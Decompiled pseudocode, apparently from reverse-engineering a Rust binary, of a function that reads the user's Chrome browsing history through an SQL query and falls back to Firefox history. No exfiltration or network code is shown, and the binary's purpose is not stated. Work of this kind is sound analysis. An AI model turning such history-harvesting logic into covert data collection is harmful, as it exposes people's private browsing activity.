__int64 __fastcall flealib::browserhistory::get_browsing_history(__int64 a1)
{
  int v1; // r15d
  __int64 v2; // r8
  __int64 v3; // r9
  __int64 v4; // rax
  __int64 v5; // r8
  __int64 v6; // r9
  __int128 v7; // xmm0
  __int128 v9; // [rsp+0h] [rbp-138h] BYREF
  __int64 v10; // [rsp+10h] [rbp-128h]
  __int128 v11; // [rsp+20h] [rbp-118h]
  __int64 v12; // [rsp+30h] [rbp-108h]
  __int128 v13; // [rsp+40h] [rbp-F8h] BYREF
  __int64 v14; // [rsp+50h] [rbp-E8h]
  _BYTE v15[8]; // [rsp+58h] [rbp-E0h] BYREF
  __int64 v16; // [rsp+60h] [rbp-D8h]
  __int64 v17; // [rsp+68h] [rbp-D0h]
  __int64 v18; // [rsp+70h] [rbp-C8h] BYREF
  __int128 v19; // [rsp+78h] [rbp-C0h]
  __int64 v20; // [rsp+88h] [rbp-B0h]
  __int128 v21; // [rsp+90h] [rbp-A8h]
  __int128 v22; // [rsp+A0h] [rbp-98h]

  std::env::var(&v18, aHome, 4LL);
  core::result::Result<T,E>::unwrap(v15, &v18, &off_70ACF8);
  alloc::vec::Vec<T,A>::append_elements(v15, aConfigGoogleCh, 38LL);
  *(_QWORD *)&v13 = 0LL;
  *((_QWORD *)&v13 + 1) = 8LL;
  v14 = 0LL;
  std::fs::metadata(&v18, v16, v17);
  v1 = v18;
  core::ptr::drop_in_place<core::result::Result<std::fs::Metadata,std::io::error::Error>>(&v18);
  if ( v1 != 2 )
  {
    flealib::browserhistory::get_history((__int64)&v18, v16, v17, (__int64)aSelectUrlTitle, 87LL);
    v4 = v18;
    v11 = v19;
    v12 = v20;
    if ( v18 != 0x8000000000000012LL )
    {
LABEL_6:
      v7 = v21;
      *(_OWORD *)(a1 + 48) = v22;
      *(_OWORD *)(a1 + 32) = v7;
      *(_QWORD *)(a1 + 24) = v12;
      *(_OWORD *)(a1 + 8) = v11;
      *(_QWORD *)a1 = v4;
      core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(&v13);
      goto LABEL_7;
    }
    alloc::vec::Vec<T,A>::append_elements(
      &v13,
      *((_QWORD *)&v11 + 1),
      v12,
      &off_70AD28,
      v2,
      v3,
      v11,
      *((_QWORD *)&v11 + 1),
      v12);
    v10 = 0LL;
    core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(&v9);
  }
  flealib::browserhistory::get_firefox_history(&v18);
  v4 = v18;
  v11 = v19;
  v12 = v20;
  if ( v18 != 0x8000000000000012LL )
    goto LABEL_6;
  alloc::vec::Vec<T,A>::append_elements(
    &v13,
    *((_QWORD *)&v11 + 1),
    v12,
    &off_70AD40,
    v5,
    v6,
    v11,
    *((_QWORD *)&v11 + 1),
    v12);
  v10 = 0LL;
  *(_QWORD *)(a1 + 24) = v14;
  *(_OWORD *)(a1 + 8) = v13;
  *(_QWORD *)a1 = 0x8000000000000012LL;
  core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(&v9);
LABEL_7:
  core::ptr::drop_in_place<alloc::string::String>(v15);
  return a1;
}